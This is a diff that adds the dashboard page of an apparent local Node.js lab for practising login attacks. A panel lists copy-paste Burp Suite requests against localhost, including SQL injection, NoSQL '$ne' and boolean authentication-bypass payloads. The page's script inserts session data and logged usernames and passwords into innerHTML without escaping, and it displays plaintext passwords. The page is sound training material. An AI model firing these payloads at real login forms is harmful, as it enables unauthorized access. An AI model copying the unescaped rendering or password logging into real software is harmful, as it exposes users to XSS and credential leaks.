@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Node.js Test</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+        .user-info {
+            background: #e3f2fd;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            border-left: 4px solid #2196f3;
+        }
+        .user-info h3 {
+            color: #0d47a1;
+            margin-bottom: 10px;
+        }
+        .user-info p {
+            margin: 5px 0;
+            color: #333;
+        }
+        .attack-box {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            border: 1px solid #dee2e6;
+        }
+        .attack-box h3 {
+            color: #495057;
+            margin-bottom: 15px;
+        }
+        pre {
+            background: #343a40;
+            color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 13px;
+            margin: 10px 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th {
+            background: #667eea;
+            color: white;
+            padding: 12px;
+            text-align: left;
+        }
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        tr:hover {
+            background: #f8f9fa;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #dc3545;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            transition: background 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #c82333;
+        }
+        .badge {
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .badge-success {
+            background: #28a745;
+            color: white;
+        }
+        .badge-info {
+            background: #17a2b8;
+            color: white;
+        }
+        .badge-warning {
+            background: #ffc107;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Login Successful (Node.js)</h1>
+        
+        <div class="user-info" id="userInfo">
+            <h3>👤 Loading user info...</h3>
+        </div>
+        
+        <div class="attack-box">
+            <h3>🎯 Burp Suite Payloads - Copy Paste Karein</h3>
+            <pre>
+# Normal Form Request
+POST /login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+username=admin&password=admin123
+
+# JSON Request
+POST /login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Content-Length: 45
+
+{"username":"admin","password":"admin123"}
+
+# SQL Injection
+POST /login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=' OR '1'='1
+
+# NoSQL Injection
+POST /login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"username":"admin","password":{"$ne":""}}
+
+# Boolean Bypass
+POST /login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"username":"admin","password":true}
+            </pre>
+        </div>
+        
+        <h3>📊 Recent Login Attempts</h3>
+        <table id="logsTable">
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Method</th>
+                    <th>Status</th>
+                </tr>
+            </thead>
+            <tbody id="logsBody">
+                <tr>
+                    <td colspan="5">Loading logs...</td>
+                </tr>
+            </tbody>
+        </table>
+        
+        <div style="margin-top: 30px; text-align: right;">
+            <a href="/logout" class="btn">Logout</a>
+        </div>
+    </div>
+    
+    <script>
+        // Fetch user info
+        fetch('/api/session')
+            .then(res => res.json())
+            .then(data => {
+                const userInfo = document.getElementById('userInfo');
+                if (data.user) {
+                    userInfo.innerHTML = `
+                        <h3>👤 Welcome, ${data.user}!</h3>
+                        <p><strong>Login Time:</strong> ${new Date(data.loginTime).toLocaleString()}</p>
+                        <p><strong>Auth Method:</strong> <span class="badge badge-info">${data.authMethod || 'normal'}</span></p>
+                    `;
+                }
+            })
+            .catch(err => {
+                document.getElementById('userInfo').innerHTML = '<h3>❌ Error loading user info</h3>';
+            });
+        
+        // Fetch logs
+        fetch('/api/logs')
+            .then(res => res.json())
+            .then(logs => {
+                const tbody = document.getElementById('logsBody');
+                if (logs.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="5">No logs yet</td></tr>';
+                } else {
+                    tbody.innerHTML = logs.map(log => {
+                        const statusClass = log.status === 'SUCCESS' ? 'badge-success' : 'badge-warning';
+                        return `
+                            <tr>
+                                <td>${new Date(log.timestamp).toLocaleString()}</td>
+                                <td>${log.username}</td>
+                                <td>${log.password.substring(0, 30)}${log.password.length > 30 ? '...' : ''}</td>
+                                <td><span class="badge badge-info">${log.method}</span></td>
+                                <td><span class="badge ${statusClass}">${log.status}</span></td>
+                            </tr>
+                        `;
+                    }).join('');
+                }
+            })
+            .catch(err => {
+                document.getElementById('logsBody').innerHTML = '<tr><td colspan="5">Error loading logs</td></tr>';
+            });
+    </script>
+</body>
+</html>
